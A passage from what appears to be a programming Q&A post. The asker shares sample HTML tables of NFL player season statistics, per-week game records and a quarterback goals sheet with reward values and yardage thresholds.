Prescott&lt;/td&gt;&lt;td&gt;DAL&lt;/td&gt;&lt;td&gt;QB&lt;/td&gt;&lt;td&gt;16&lt;/td&gt;&lt;td&gt;410&lt;/td&gt;&lt;td&gt;4449&lt;/td&gt;&lt;td&gt;37&lt;/td&gt;&lt;td&gt;146&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;7&lt;/td&gt;&lt;td&gt;Josh Allen&lt;/td&gt;&lt;td&gt;BUF&lt;/td&gt;&lt;td&gt;QB&lt;/td&gt;&lt;td&gt;17&lt;/td&gt;&lt;td&gt;409&lt;/td&gt;&lt;td&gt;4407&lt;/td&gt;&lt;td&gt;36&lt;/td&gt;&lt;td&gt;763&lt;/td&gt;&lt;td&gt;6&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;6&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;88&lt;/td&gt;&lt;td&gt;Ezekiel Elliott&lt;/td&gt;&lt;td&gt;DAL&lt;/td&gt;&lt;td&gt;RB&lt;/td&gt;&lt;td&gt;17&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1002&lt;/td&gt;&lt;td&gt;10&lt;/td&gt;&lt;td&gt;287&lt;/td&gt;&lt;td&gt;47&lt;/td&gt;&lt;td&gt;12&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;89&lt;/td&gt;&lt;td&gt;Marcus Mariota&lt;/td&gt;&lt;td&gt;LVR&lt;/td&gt;&lt;td&gt;QB&lt;/td&gt;&lt;td&gt;10&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;87&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;90&lt;/td&gt;&lt;td&gt;Johnny Hekker&lt;/td&gt;&lt;td&gt;LAR&lt;/td&gt;&lt;td&gt;QB&lt;/td&gt;&lt;td&gt;17&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;91&lt;/td&gt;&lt;td&gt;Greg Ward&lt;/td&gt;&lt;td&gt;PHI&lt;/td&gt;&lt;td&gt;QB&lt;/td&gt;&lt;td&gt;17&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;95&lt;/td&gt;&lt;td&gt;7&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;92&lt;/td&gt;&lt;td&gt;Kendall Hinton&lt;/td&gt;&lt;td&gt;DEN&lt;/td&gt;&lt;td&gt;WR&lt;/td&gt;&lt;td&gt;16&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;175&lt;/td&gt;&lt;td&gt;15&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;93&lt;/td&gt;&lt;td&gt;Keenan Allen&lt;/td&gt;&lt;td&gt;LAC&lt;/td&gt;&lt;td&gt;WR&lt;/td&gt;&lt;td&gt;16&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1138&lt;/td&gt;&lt;td&gt;106&lt;/td&gt;&lt;td&gt;6&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;6&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;94&lt;/td&gt;&lt;td&gt;Danny Amendola&lt;/td&gt;&lt;td&gt;HOU&lt;/td&gt;&lt;td&gt;QB&lt;/td&gt;&lt;td&gt;8&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;248&lt;/td&gt;&lt;td&gt;24&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;95&lt;/td&gt;&lt;td&gt;Cole Beasley&lt;/td&gt;&lt;td&gt;BUF&lt;/td&gt;&lt;td&gt;WR&lt;/td&gt;&lt;td&gt;16&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;693&lt;/td&gt;&lt;td&gt;82&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;OFFENSE&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</code></pre>
</div>
</div>
</p>
<p><code>Game Wise Record</code> (I am only adding some  sample rows, there are 20k+ rows in it)</p>
<p><div class=""snippet"" data-lang=""js"" data-hide=""false"" data-console=""true"" data-babel=""false"">
<div class=""snippet-code"">
<pre class=""snippet-code-html lang-html prettyprint-override""><code>&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th&gt;Index&lt;/th&gt;&lt;th&gt;Week&lt;/th&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Team&lt;/th&gt;&lt;th&gt;Starter&lt;/th&gt;&lt;th&gt;Interceptions&lt;/th&gt;&lt;th&gt;PassesDefended&lt;/th&gt;&lt;th&gt;Sacks&lt;/th&gt;&lt;th&gt;SoloTackles&lt;/th&gt;&lt;th&gt;TacklesForLoss&lt;/th&gt;&lt;th&gt;FumblesForced&lt;/th&gt;&lt;th&gt;PassesCompletions&lt;/th&gt;&lt;th&gt;PassingYards&lt;/th&gt;&lt;th&gt;PassingTouchdowns&lt;/th&gt;&lt;th&gt;PassingInterceptions&lt;/th&gt;&lt;th&gt;RushingYards&lt;/th&gt;&lt;th&gt;RushingTouchdowns&lt;/th&gt;&lt;th&gt;Receptions&lt;/th&gt;&lt;th&gt;ReceivingYards&lt;/th&gt;&lt;th&gt;ReceivingTouchdowns&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Jourdan Lewis&lt;/td&gt;&lt;td&gt;DAL&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Trevon Diggs&lt;/td&gt;&lt;td&gt;DAL&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Anthony Brown&lt;/td&gt;&lt;td&gt;DAL&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;6&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Jayron Kearse&lt;/td&gt;&lt;td&gt;DAL&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Micah Parsons&lt;/td&gt;&lt;td&gt;DAL&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Keanu Neal&lt;/td&gt;&lt;td&gt;DAL&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;6&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;DeMarcus Lawrence&lt;/td&gt;&lt;td&gt;DAL&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;7&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Jaylon Smith&lt;/td&gt;&lt;td&gt;DAL&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;8&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Dorance Armstrong Jr.&lt;/td&gt;&lt;td&gt;DAL&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Tarell Basham&lt;/td&gt;&lt;td&gt;DAL&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5175&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;Patrick Mahomes&lt;/td&gt;&lt;td&gt;KAN&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;33&lt;/td&gt;&lt;td&gt;272&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;61&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5176&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;Darrel Williams&lt;/td&gt;&lt;td&gt;KAN&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;27&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;18&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5177&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;Tyreek Hill&lt;/td&gt;&lt;td&gt;KAN&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;15&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;7&lt;/td&gt;&lt;td&gt;63&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5178&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;Clyde Edwards-Helaire&lt;/td&gt;&lt;td&gt;KAN&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;13&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;11&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5179&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;Jerick McKinnon&lt;/td&gt;&lt;td&gt;KAN&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;13&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5180&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;Michael Burton&lt;/td&gt;&lt;td&gt;KAN&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5181&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;Mecole Hardman&lt;/td&gt;&lt;td&gt;KAN&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;76&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;5182&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;Travis Kelce&lt;/td&gt;&lt;td&gt;KAN&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;6&lt;/td&gt;&lt;td&gt;57&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</code></pre>
</div>
</div>
</p>
<p>And lastly, there's a <code>Player Goals File</code> (<strong>this is an Excel File containing Sheets for each of the position, I am only sharing for QB sheet, to keep the question short. IF needed, I can share the rest too)</strong></p>
<p><div class=""snippet"" data-lang=""js"" data-hide=""false"" data-console=""true"" data-babel=""false"">
<div class=""snippet-code"">
<pre class=""snippet-code-html lang-html prettyprint-override""><code>&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;th&gt;Goal&lt;/th&gt;&lt;th&gt;Goal Type&lt;/th&gt;&lt;th&gt;PCC Reward&lt;/th&gt;&lt;th&gt;Target&lt;/th&gt;&lt;th&gt;Min Value&lt;/th&gt;&lt;th&gt;Max Value&lt;/th&gt;&lt;th&gt;Games Required&lt;/th&gt;&lt;th&gt;Started&lt;/th&gt;&lt;th&gt;Level 99 PCC Reward x4 (current series)&lt;/th&gt;&lt;th&gt;TImes achieved&lt;/th&gt;&lt;th&gt;PCC Rewarded&lt;/th&gt;&lt;th&gt; &lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Throw 300-399 yds&lt;/td&gt;&lt;td&gt;Game&lt;/td&gt;&lt;td&gt;25&lt;/td&gt;&lt;td&gt;PassingYards&lt;/td&gt;&lt;td&gt;300&lt;/td&gt;&lt;td&gt;399&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;100&lt;/td&gt;&lt;td&gt;8&lt;/td&gt;&lt;td&gt;200&lt;/td&gt;&lt;td&gt; &lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Throw 400-499 yds&lt;/td&gt;&lt;td&gt;Game&lt;/td&gt;&lt;td&gt;50&lt;/td&gt;&lt;td&gt;PassingYards&lt;/td&gt;&lt;td&gt;400&lt;/td&gt;&lt;td&gt;499&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;200&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;250&lt;/td&gt;&lt;td&gt;1000&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Throw 500+ yds&lt;/td&gt;&lt;td&gt;Game&lt;/td&gt;&lt;td&gt;150&lt;/td&gt;&lt;td&gt;PassingYards&lt;/td&gt;&lt;td&gt;500&lt;/td&gt;&lt;td&gt;99999&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;600&lt;/td&gt;&lt;td&gt; &lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Throw 2 